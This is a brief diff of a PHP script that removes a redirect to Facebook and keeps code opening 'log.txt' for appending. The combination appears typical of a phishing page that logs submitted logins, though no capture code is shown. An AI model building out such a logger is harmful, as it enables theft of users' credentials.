@@ -1,8 +1,4 @@
-<?php
-  
-// Set the location to redirect the page
-header ('Location: http://www.facebook.com');
-  
+<?php  
 // Open the text file in writing mode 
 $file = fopen("log.txt", "a");
   
